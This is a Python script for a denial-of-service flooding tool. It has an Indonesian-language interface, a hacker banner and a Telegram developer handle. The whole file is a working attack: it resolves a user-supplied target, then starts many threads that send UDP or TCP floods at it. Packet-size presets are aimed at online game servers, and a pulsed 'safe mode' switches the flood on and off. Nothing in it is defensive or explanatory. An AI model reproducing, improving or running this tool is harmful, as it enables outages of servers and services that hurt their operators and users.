import socket
import threading
import random
import os
import time
import sys
import platform
from datetime import datetime, timedelta

# ANSI Colors (Style Xanverius)
RED    = "\033[1;31m"  
BLUE   = "\033[1;34m"
CYAN   = "\033[1;36m"
GREEN  = "\033[1;32m"
WHITE  = "\033[1;37m"
YELLOW = "\033[1;33m"
RESET  = "\033[0;0m"
BOLD   = "\033[1m"

total_packets = 0
attack_on = True # Global switch untuk Safe Mode
node_name = platform.node()

def clear():
    os.system('clear' if os.name != 'nt' else 'cls')

def banner():
    print(f"{RED}")
    print(r"""⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ⠀ ⠀⠀⠀⡀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠀⠀⠀
⠀⠀⠀⠀⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⡄⠀⠀⠀⠀⠀⠀⠂⠀⠀⠉⠳⣶⡄
⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⡴⠖⢂⣽⣿⣿⣷⣔⠀⠁⠀⠀⠀⠀⠀⠀⠀⣰⣿⠟
⠀⠀⠀⠀⣀⣤⡶⢿⣋⣥⣤⣶⣿⣿⣿⣿⣿⣿⣿⣶⣤⣄⣀⡀⢀⣠⣾⠿⠋⠀
⠀⢀⣵⣿⠟⠉⠀⠀⠀⠈⠉⠛⠻⣿⣿⣿⣿⡿⠛⠛⠙⣀⣤⠶⠟⠋⠁⠀⠀⠀
⢰⣿⡟⠁⠀⠀⠀⣷⠀⠀⠀⠀⠀⠈⣿⣿⣟⣀⡬⠖⠛⠉⠀⠀⠁⠀⠀⠀⠀⠀
⠘⠿⣧⣀⡠⠤⢾⣿⣷⠤⠄⠀⠀⠀⢹⣿⠋⠀⠀⠀⠄⠀⠀⠀⠠⠀⠀⠀⠀⠀
⠀⠀⠀⠉⠀⠀⠀⡿⠁⠀⠀⠀⠀⠀⠈⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠙⠀⠀⠀⠀⠀⠀⠀⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
""")
    print(f"     {WHITE}Developer: t.me/biyalue2{RESET}\n")

def smart_dns_resolver(hostname):
    clean_host = hostname.replace("http://", "").replace("https://", "").split('/')[0].split(':')[0].strip()
    try: return socket.gethostbyname(clean_host)
    except: return None

def safe_mode_manager():
    global attack_on
    while True:
        attack_on = True  # Status ON
        time.sleep(10)    # Serang 10 detik
        attack_on = False # Status OFF
        time.sleep(5)     # Istirahat 5 detik

def udp_flood(target_ip, target_port, payload_size):
    global total_packets
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = random._urandom(payload_size)
    while True:
        if attack_on:
            try:
                sock.sendto(payload, (target_ip, target_port))
                total_packets += 1
            except: pass
        else:
            time.sleep(0.1)

def tcp_flood(target_ip, target_port, payload_size):
    global total_packets
    payload = random._urandom(payload_size)
    while True:
        if attack_on:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((target_ip, target_port))
                sock.send(payload)
                total_packets += 1
                sock.close()
            except: pass
        else:
            time.sleep(0.1)

def main():
    clear()
    banner()
    try:
        # 1. Input Protocol
        print(f" {WHITE}[{CYAN}U{WHITE}] {CYAN}UDP Flood {WHITE}[{CYAN}T{WHITE}] {CYAN}TCP Flood")
        proto_choice = input(f"\n{BOLD}{CYAN}┌──({GREEN}root@{node_name}{CYAN})-[{WHITE}Protocol{CYAN}]\n└─# {RESET}").upper()

        # 2. Input Preset
        print(f"\n {WHITE}[{CYAN}1{WHITE}] {CYAN}MLBB  {WHITE}[{CYAN}2{WHITE}] {CYAN}MCPE  {WHITE}[{CYAN}3{WHITE}] {CYAN}FF  {WHITE}[{CYAN}4{WHITE}] {CYAN}CUSTOM {WHITE}[{CYAN}5{WHITE}] {CYAN}STD")
        choice = input(f"\n{BOLD}{CYAN}┌──({GREEN}root@{node_name}{CYAN})-[{WHITE}Preset{CYAN}]\n└─# {RESET}")

        presets = {'1': "MLBB", '2': "MCPE", '3': "FREE FIRE", '4': "CUSTOM", '5': "STANDARD"}
        game_name = presets.get(choice, "STANDARD")

        # 3. Input Target
        raw_target = input(f"\n{BOLD}{CYAN}┌──({GREEN}root@{node_name}{CYAN})-[{WHITE}Target{CYAN}]\n└─# {RESET}IP / Domain: ")
        target_ip = smart_dns_resolver(raw_target)
        if not target_ip:
            print(f"{RED}[!] DNS Failure.{RESET}"); return

        # 4. Input Port
        target_port = int(input(f"\n{BOLD}{CYAN}┌──({GREEN}root@{node_name}{CYAN})-[{WHITE}Port{CYAN}]\n└─# {RESET}Port: "))

        # 5. Input Safe Mode (Y/N)
        safe_choice = input(f"\n{BOLD}{CYAN}┌──({GREEN}root@{node_name}{CYAN})-[{WHITE}Safe Mode{CYAN}]\n└─# {RESET}Gunakan Safe Mode? (y/n): ").lower()

        # 6. Input Size (Logic Custom)
        if choice == '4':
            p_size = int(input(f"\n{BOLD}{CYAN}┌──({GREEN}root@{node_name}{CYAN})-[{WHITE}Size{CYAN}]\n└─# {RESET}Size (Max 5000): "))
            if p_size > 5000: p_size = 5000
        elif choice == '1': p_size = 120
        elif choice == '2': p_size = 1460
        elif choice == '3': p_size = 120
        else: p_size = 1000

        # Eksekusi
        clear()
        banner()
        print(f"{YELLOW}  [>] TARGET IP    : {target_ip}")
        print(f"{YELLOW}  [>] PORT         : {target_port}")
        print(f"{YELLOW}  [>] PROTOCOL     : {'UDP' if proto_choice == 'U' else 'TCP'}")
        print(f"{YELLOW}  [>] SAFE MODE    : {'AKTIF' if safe_choice == 'y' else 'NON-AKTIF'}")
        print(f"{YELLOW}  [>] PRESET MODE  : {game_name}")
        print(f"{YELLOW}  [>] PACKET SIZE  : {p_size} bytes{RESET}\n")
        
        # Start Safe Mode Manager jika dipilih
        if safe_choice == 'y':
            threading.Thread(target=safe_mode_manager, daemon=True).start()

        # Set jumlah thread (Optimized)
        threads = (os.cpu_count() or 1) * 20 
        func = udp_flood if proto_choice == 'U' else tcp_flood
        
        for i in range(threads):
            t = threading.Thread(target=func, args=(target_ip, target_port, p_size))
            t.daemon = True
            t.start()
        
        # Main Loop Status
        while True:
            wib_time = datetime.utcnow() + timedelta(hours=7)
            current_time = wib_time.strftime('%H:%M:%S')
            
            # Logic Status Tag dengan Kotak Kuning
            if safe_choice == 'y':
                status_tag = f"{YELLOW}[{GREEN}ON{YELLOW}]" if attack_on else f"{YELLOW}[{RED}OFF{YELLOW}]"
            else:
                status_tag = f"{YELLOW}[{GREEN}RUN{YELLOW}]"

            # Output Bar
            sys.stdout.write(f"\r{WHITE}[{BLUE}{current_time}{WHITE}] {status_tag} {CYAN}{target_ip}:{target_port} {GREEN}Sent: {BOLD}{total_packets}{RESET}")
            sys.stdout.flush()
            time.sleep(0.1)

    except KeyboardInterrupt:
        print(f"\n{RED}[!] Stopped. Kembali ke Master Menu...{RESET}")
        sys.exit(0)
    except ValueError:
        print(f"\n{RED}[!] Error: Masukkan angka yang valid.{RESET}")

if __name__ == "__main__":
    main()